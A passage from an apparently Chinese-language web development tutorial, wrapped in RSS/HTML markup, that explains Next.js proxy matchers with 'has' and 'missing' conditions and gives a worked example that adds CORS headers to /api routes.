    <span class="hljs-keyword">if</span> (cookie &amp;&amp; cookie.<span class="hljs-property">value</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/'</span>, request.<span class="hljs-property">url</span>));
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {
    <span class="hljs-attr">matcher</span>: [<span class="hljs-string">'/api/:path*'</span>, <span class="hljs-string">'/home/:path*'</span>],
}
</code></pre>
<h4 data-id="heading-3">复杂匹配</h4>
<ul>
<li>source: 表示匹配路径</li>
<li>has: 表示匹配路径中必须(包含)某些条件</li>
<li>missing: 表示匹配路径中(必须不包含)某些条件</li>
</ul>
<p><strong>type</strong> 只能匹配: header, query, cookie</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ProxyConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'start proxy'</span>)
   <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">ProxyConfig</span> = {
    <span class="hljs-attr">matcher</span>: [
        {
            <span class="hljs-attr">source</span>: <span class="hljs-string">'/home/:path*'</span>,
            <span class="hljs-comment">//表示匹配路径中必须(包含)Authorization头和userId查询参数</span>
            <span class="hljs-attr">has</span>: [
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'header'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'Authorization'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'Bearer 123456'</span> },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'query'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'userId'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'123'</span> }
            ],
            <span class="hljs-comment">//表示匹配路径中(必须不包含)cookie和userId查询参数</span>
            <span class="hljs-attr">missing</span>: [
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'cookie'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'token'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'123456'</span> },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'query'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'userId'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'456'</span> },
            ]
        },
    ]
}
</code></pre>
<p>访问url为：<code>http://localhost:3000/home?userId=123</code></p>
<h4 data-id="heading-4">案例实战(处理跨域)</h4>
<p>只要是/api下面的接口都可以被任意访问</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ProxyConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(corsHeaders).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
        response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(key, value);
    })
    <span class="hljs-keyword">return</span> response;
}

<span class="hljs-keyword">const</span> corsHeaders = {
    <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,
    <span class="hljs-string">'Access-Control-Allow-Methods'</span>: <span class="hljs-string">'GET, POST, PUT, DELETE, OPTIONS'</span>,
    <span class="hljs-string">'Access-Control-Allow-Headers'</span>: <span class="hljs-string">'Content-Type, Authorization'</span>,
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">ProxyConfig</span> = {
   <span class="hljs-attr">matcher</span>:<span class="hljs-string">'/api/:path*'</span>,
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb6ec749269e4c428d9ed3e7d8cf9a8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764507639&amp;x-signature=sOLI4%2BJZEG05m3caC%2F6GzrkV9SA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>